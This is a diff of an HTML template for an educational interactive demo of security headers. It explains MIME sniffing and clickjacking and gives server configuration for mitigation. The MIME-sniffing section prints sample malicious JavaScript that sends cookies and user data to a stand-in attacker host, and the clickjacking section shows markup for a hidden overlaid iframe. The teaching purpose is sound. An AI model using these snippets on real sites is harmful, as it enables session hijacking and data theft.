@@ -2,44 +2,438 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Headers Demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Headers Interactive Demo</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <h1>🛡️ Security Headers Interactive Demo</h1>
-    <div class="tabs">
-        <button class="tab-button" onclick="showTab('xcto')">X-Content-Type-Options</button>
-        <button class="tab-button" onclick="showTab('xfo')">X-Frame-Options</button>
-        <button class="tab-button" onclick="showTab('csp')">Content-Security-Policy</button>
-        <!-- Add more tabs for 
-         hsts
-         referrer policy
-         permissions policy -->
+    <div class="container">
+        <h1>🛡️ Security Headers Interactive Demo</h1>
+        
+        <div class="tabs">
+            <button class="tab-button active" onclick="showTab('xcto')">X-Content-Type-Options</button>
+            <button class="tab-button" onclick="showTab('xfo')">X-Frame-Options</button>
+            <button class="tab-button" onclick="showTab('csp')">Content-Security-Policy</button>
+        </div>
+
+<!-- X-CONTENT-TYPE-OPTIONS TAB CONTENT-->
+        <div id="xcto" class="tab-content active">
+            <!-- Header Explanation -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">📋</span>
+                    <h2 class="section-title">Understanding X-Content-Type-Options</h2>
+                </div>
+                
+                <div class="intro-grid">
+                    <div class="info-card">
+                        <h4>🎯 What It Does</h4>
+                        <p>Prevents browsers from MIME-sniffing a response away from the declared Content-Type. When set to "nosniff", browsers must respect the server's Content-Type header exactly.
+                        <br>What's MIME-sniffing?
+                        <br>Originally it was meant to be helpful by fixing broken servers that didn't set headers correctly. The browser would do this by checking the content, and guessing the correct way to render it in the hopes that this would improve the user experience.
+                        <br>Unfortunately in security contexts, this behavior can be seriously dangerous if not properly controlled.
+                        </p>                        
+                    </div>
+                    <div class="info-card">
+                        <h4>⚠️ The Risk</h4>
+                        <p>Without this header, browsers may execute files as JavaScript even when served with innocent MIME types like text/plain or image/jpeg, leading to XSS attacks.
+                        <br>For example: A browser might treat a file such as "example.txt" as JavaScript because it contains JavaScript code in it.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="code-block" data-label="HTTP Response Header">
+                X-Content-Type-Options: nosniff</div>
+            </div>
+
+            <!-- Real-World Scenario -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">🏢</span>
+                    <h2 class="section-title">Real-World Scenario: Corporate Document Portal</h2>
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                    Imagine you work for <strong>SecureCorp</strong>, which has an internal document sharing portal where employees upload reports, presentations, and other business files. The system is designed to accept various file types for legitimate business purposes.
+                </p>
+
+                <div class="info-card">
+                    <h4>🎯 Legitimate Use Case</h4>
+                    <p>Employees upload quarterly reports (quarterly-report.txt), meeting notes, configuration files, and data exports. These text files contain sensitive business information and are meant to be viewed as plain text documents.</p>
+                </div>
+            </div>
+
+            <!-- Attack Scenario -->
+            <div class="section interactive-section">
+                <div class="section-header">
+                    <span class="section-icon">🎭</span>
+                    <h2 class="section-title">Interactive Demo: The Attack</h2>
+                </div>
+
+                <div class="interactive-badge">
+                    <span class="interactive-icon">🎮</span>
+                    <span>Try the interactive simulation below</span>
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                    An attacker (perhaps a disgruntled employee or someone who gained access) uploads what appears to be a harmless text file called "team-updates.txt" but contains malicious JavaScript code instead of actual team updates.
+                </p>
+                <p style="margin-bottom: 20px; color: #666;">
+                    What employees expect to see:
+                    <div class="code-block" data-label="File Contents">Team Updates for Q4...
+                </div></p>
+                <p style="margin-bottom: 20px; color: #666;">
+                    What's actually in the file:
+                    <div class="code-block" data-label="Malicious File Contents">document.location='http://evil-site.com/steal?data='+document.cookie;
+                </div></p>
+                <p style="margin-bottom: 20px; color: #666;">
+                    Which attempts to send a victim user's cookie to a website owned by the attacker, which they would then use to steal the victim's active session on the vulnerable website.
+                    <br>OR
+                    <div class="code-block" data-label="Malicious File Contents">fetch('/api/users').then(r=>r.json()).then(users=>
+                    <br>  fetch('http://evil-site.com/exfil', {
+                    <br>    method: 'POST', 
+                    <br>    body: JSON.stringify(users)
+                    <br>  }));
+                </div></p>
+                <p style="margin-bottom: 20px; color: #666;">
+                    Which attempts to steal sensitive data, and send it back to the attacker controlled website. This could include anything from a list of users to login tokens.
+                </p>
+                <p style="margin-bottom: 20px; color: #666;">
+                    Our demo below will not do anything so malicious. Instead for demonstration purposes, it will simply pop an alert as a proof of concept.
+                </p>
+
+
+                <div class="demo-container">
+                    <h3 style="margin-bottom: 20px; color: #333;">📁 File Upload Simulation</h3>
+                    
+                    <div class="upload-simulator" id="uploadArea">
+                        <div class="file-icon">📄</div>
+                        <h4>team-updates.txt</h4>
+                        <p style="color: #666; margin-top: 10px;">Click "Upload Malicious File" to simulate an attacker uploading this file</p>
+                        
+                        <div class="code-block" data-label="Malicious File Contents" style="margin-top: 20px; text-align: left;">
+                            alert('🚨 SIMULATED ATTACK: Your session would be stolen!\n\nIn reality, this would happen silently in the background.');
+                        </div>
+                    </div>
+
+                    <div class="controls">
+                        <button class="btn btn-danger" id="uploadBtn" onclick="simulateUpload()">
+                            Upload Malicious File
+                        </button>
+                        <button class="btn btn-danger" id="disableBtn" onclick="toggleHeader(false)" disabled>
+                            ⚠️ Disable Protection
+                        </button>
+                        <button class="btn btn-primary" id="enableBtn" onclick="toggleHeader(true)">
+                            🛡️ Enable Protection
+                        </button>
+                    </div>
+
+                    <div class="status-indicator" id="headerStatus">
+                        <span id="statusIcon">🚨</span>
+                        <span id="statusText">X-Content-Type-Options: DISABLED (Vulnerable)</span>
+                    </div>
+
+                    <div class="result-box result-info" id="resultBox">
+                        Click "Upload Malicious File" to see what happens when someone visits this file...
+                    </div>
+
+                    <div class="technical-details" id="technicalDetails" style="display: none;">
+                        <p class="technical-explanation" id="technicalExplanation">
+                            <!-- Technical details will be populated by JavaScript -->
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Impact Analysis -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">💥</span>
+                    <h2 class="section-title">Real-World Impact</h2>
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                    This isn't just about popup alerts. In a real attack, the consequences for SecureCorp could be devastating:
+                </p>
+
+                <div class="impact-grid">
+                    <div class="impact-card">
+                        <h5>🔓 Session Hijacking</h5>
+                        <p>Steal employee login sessions to access sensitive systems and data without credentials.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>📊 Data Exfiltration</h5>
+                        <p>Extract customer data, financial records, or trade secrets, and send them to attacker-controlled servers.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>🎭 Privilege Escalation</h5>
+                        <p>If an admin clicks the malicious file, attacker gains admin access to modify users, permissions, and critical settings.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>💰 Financial Impact</h5>
+                        <p>Million dollar fines, regulatory penalties, customer lawsuits, business disruption, and reputation damage.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>🕵️ Persistence</h5>
+                        <p>Install backdoors, create new admin accounts, and maintain long-term access to the corporate network.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>🏭 Supply Chain Attack</h5>
+                        <p>Use compromised corporate systems to attack business partners and customers, spreading the breach.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mitigation -->
+            <div class="section">
+                <div class="mitigation-section">
+                    <h4><span>🛡️</span> How to Protect Your Application</h4>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                        <div>
+                            <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
+                            <div class="code-block" data-label="Apache (.htaccess)">
+                            Header always set X-Content-Type-Options nosniff</div>
+                            
+                            <div class="code-block" data-label="Nginx">
+                            add_header X-Content-Type-Options nosniff;</div>
+                        </div>
+                        
+                        <div>
+                            <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
+                            <div class="code-block" data-label="Express.js">
+                            app.use((req, res, next) => {
+                            res.header('X-Content-Type-Options', 'nosniff');
+                            next();
+                            });</div>
+                            
+                            <div class="code-block" data-label="Flask/Django">
+                            response.headers['X-Content-Type-Options'] = 'nosniff'</div>
+                        </div>
+                    </div>
+
+                    <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                        <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                        <ul style="color: #666; line-height: 2;">
+                            <li>✅ Set X-Content-Type-Options: nosniff on all responses</li>
+                            <li>✅ Validate file types on upload (don't trust extensions)</li>
+                            <li>✅ Use a Web Application Firewall</li>
+                            <li>✅ Use Content Security Policy as additional defense</li>
+                            <li>✅ Regularly scan for security headers with tools like securityheaders.com</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+<!-- X-FRAME-OPTIONS TAB CONTENT-->
+        <div id="xfo" class="tab-content">
+            <!-- Header Explanation -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">🖼️</span>
+                    <h2 class="section-title">Understanding X-Frame-Options</h2>
+                </div>
+                
+                <div class="intro-grid">
+                    <div class="info-card">
+                        <h4>🎯 What It Does</h4>
+                        <p>Prevents your website from being embedded in frames or iframes on other domains. Controls whether browsers should allow your site to be displayed within frames, preventing clickjacking attacks.
+                        <br>What's an iframe? It's like a window within a window, where the content inside can come from the same site or a completely different one.
+                        <br>What's clickjacking? It's when an attacker tricks you into clicking something on a website that looks harmless, but secretly performs a dangerous action.
+                        </p>
+                    </div>
+                    <div class="info-card">
+                        <h4>⚠️ The Risk</h4>
+                        <p>Without this header, attackers can embed your site invisibly in their malicious pages, tricking users into clicking on your site while thinking they're interacting with the attacker's content.
+                        <br>Additionally, an attacker could do the opposite. They could copy your site within an iframe without doing any actual work to recreate the website from scratch. Then, create invisible inputs to trick user into submitting their credentials on what they think is the legitimate site when it's actually the attacker's site.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="code-block" data-label="HTTP Response Header">
+                X-Frame-Options: DENY
+                X-Frame-Options: SAMEORIGIN
+                X-Frame-Options: ALLOW-FROM https://trusted-site.com</div>
+            </div>
+
+            <!-- Real-World Scenario -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">🏦</span>
+                    <h2 class="section-title">Real-World Scenario: Online Banking Portal</h2>
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                    Imagine <strong>SecureBank</strong> has an online banking portal where customers log in to check balances, transfer money, and manage accounts. The bank's website handles sensitive financial transactions and personal data.
+                </p>
+
+                <div class="info-card">
+                    <h4>🎯 Legitimate Use Case</h4>
+                    <p>Customers visit securebank.com directly to access their accounts, make transfers, and view statements. The banking interface should only appear on the bank's own domain to ensure security and user trust.</p>
+                </div>
+            </div>
+
+            <!-- Attack Scenario -->
+            <div class="section interactive-section">
+                <div class="section-header">
+                    <span class="section-icon">🎭</span>
+                    <h2 class="section-title">Interactive Demo: Clickjacking Attack</h2>
+                </div>
+
+                <div class="interactive-badge">
+                    <span class="interactive-icon">🎮</span>
+                    <span>Try the interactive clickjacking simulation below</span>
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                    An attacker creates a fake website (evil-deals.com) that appears to offer amazing deals, but secretly embeds the bank's login page invisibly. Users think they're clicking "Claim Your Prize" but are actually clicking the bank's "Transfer Money" button.
+                </p>
+
+                <div class="demo-container">
+                    <h3 style="margin-bottom: 20px; color: #333;">🕸️ Clickjacking Attack Simulation</h3>
+                    
+                    <div class="upload-simulator" id="clickjackArea">
+                        <div class="file-icon">🎁</div>
+                        <h4>AMAZING PRIZE GIVEAWAY!</h4>
+                        <p style="color: #666; margin-top: 10px;">Click the button below to see how clickjacking works</p>
+                        
+                        <div class="code-block" data-label="Malicious Website Code" style="margin-top: 20px; text-align: left;">
+                        &lt;!-- Attacker's page: evil-deals.com --&gt;
+                        &lt;div style="position: relative;"&gt;
+                        &lt;button&gt;🎁 CLAIM YOUR $1000 PRIZE! 🎁&lt;/button&gt;
+                        
+                        &lt;!-- Hidden bank iframe positioned over the button --&gt;
+                        &lt;iframe src="https://securebank.com/transfer"
+                                style="position: absolute; opacity: 0; 
+                                        top: 0; left: 0; width: 100%; height: 100%"&gt;
+                        &lt;/iframe&gt;
+                        &lt;/div&gt;
+                        </div>
+                    </div>
+
+                    <div class="controls">
+                        <button class="btn btn-danger" id="clickjackBtn" onclick="simulateClickjack()">
+                            🎁 Claim Your Prize! (Clickjacking Demo)
+                        </button>
+                        <button class="btn btn-danger" id="disableFrameBtn" onclick="toggleFrameProtection(false)" disabled>
+                            ⚠️ Disable Frame Protection
+                        </button>
+                        <button class="btn btn-primary" id="enableFrameBtn" onclick="toggleFrameProtection(true)">
+                            🛡️ Enable Frame Protection
+                        </button>
+                    </div>
+
+                    <div class="status-indicator" id="frameStatus">
+                        <span id="frameStatusIcon">🚨</span>
+                        <span id="frameStatusText">X-Frame-Options: DISABLED (Vulnerable)</span>
+                    </div>
+
+                    <div class="result-box result-info" id="frameResultBox">
+                        Click "Claim Your Prize!" to see how clickjacking tricks users into unintended actions...
+                    </div>
+
+                    <div class="technical-details" id="frameTechnicalDetails" style="display: none;">
+                        <p class="technical-explanation" id="frameTechnicalExplanation">
+                            <!-- Technical details will be populated by JavaScript -->
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Impact Analysis -->
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">💥</span>
+                    <h2 class="section-title">Real-World Impact</h2>
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                    Clickjacking attacks on financial institutions have caused massive damage. Here's what SecureBank could face:
+                </p>
+
+                <div class="impact-grid">
+                    <div class="impact-card">
+                        <h5>💸 Unauthorized Transfers</h5>
+                        <p>Customers unknowingly authorize money transfers to attacker accounts, leading to direct financial theft and bank liability.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>🔐 Account Compromises</h5>
+                        <p>Trick users into changing passwords, email addresses, or security settings, giving attackers full account control.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>📋 Information Disclosure</h5>
+                        <p>Force users to share account details, balances, transaction history, and personal information with malicious sites.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>⚖️ Regulatory Violations</h5>
+                        <p>Banking regulators impose severe penalties for insufficient security controls - fines can reach millions of dollars.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>🏛️ Trust Destruction</h5>
+                        <p>Customers lose faith in the bank's security, leading to account closures, negative publicity, and long-term reputation damage.</p>
+                    </div>
+                    <div class="impact-card">
+                        <h5>📊 Mass Exploitation</h5>
+                        <p>Attackers can scale clickjacking attacks to thousands of users simultaneously through social media and ad networks.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mitigation -->
+            <div class="section">
+                <div class="mitigation-section">
+                    <h4><span>🛡️</span> How to Protect Your Application</h4>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                        <div>
+                            <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
+                            <div class="code-block" data-label="Apache (.htaccess)">
+                            Header always set X-Frame-Options DENY</div>
+                            
+                            <div class="code-block" data-label="Nginx">
+                            add_header X-Frame-Options SAMEORIGIN;</div>
+                        </div>
+                        
+                        <div>
+                            <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
+                            <div class="code-block" data-label="Express.js">
+                            app.use((req, res, next) => {
+                            res.header('X-Frame-Options', 'DENY');
+                            next();
+                            });</div>
+                            
+                            <div class="code-block" data-label="Flask/Django">
+                            response.headers['X-Frame-Options'] = 'SAMEORIGIN'</div>
+                        </div>
+                    </div>
+
+                    <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                        <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                        <ul style="color: #666; line-height: 2;">
+                            <li>✅ Set X-Frame-Options: DENY for maximum protection</li>
+                            <li>✅ Use SAMEORIGIN only if you need to frame your own content</li>
+                            <li>✅ Consider upgrading to Content-Security-Policy: frame-ancestors</li>
+                            <li>✅ Test framing protection with browser dev tools</li>
+                            <li>✅ Monitor for attempts to bypass frame protection</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+<!-- CONTENT-SECURITY-POLICY TAB CONTENT-->
+        <div id="csp" class="tab-content">
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">🔒</span>
+                    <h2 class="section-title">Content-Security-Policy</h2>
+                </div>
+                <p style="color: #666; font-size: 1.1rem;">Coming soon... This will demonstrate XSS prevention through CSP implementation.</p>
+            </div>
+        </div>
     </div>
 
-    <div id="xcto" class="tab-content">
-        <h2>X-Content-Type-Options</h2>
-        <p><strong>Risk:</strong> MIME sniffing can lead to script execution.</p>
-        <p><strong>POC:</strong> Upload a `.txt` file with embedded JavaScript. Without the header, the browser may execute it.</p>
-        <p><strong>Mitigation:</strong> Add <code>X-Content-Type-Options: nosniff</code> to prevent MIME sniffing.</p>
-        <iframe src="/static/poc/xcto-demo.html" width="100%" height="1000"></iframe>
-    </div>
-
-    <div id="xfo" class="tab-content" style="display:none;">
-        <h2>X-Frame-Options</h2>
-        <p>Coming soon...</p>
-    </div>
-
-    <div id="csp" class="tab-content" style="display:none;">
-        <h2>Content-Security-Policy</h2>
-        <p>Coming soon...</p>
-    </div>
-
-    <script>
-        function showTab(id) {
-            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
-            document.getElementById(id).style.display = 'block';
-        }
-    </script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
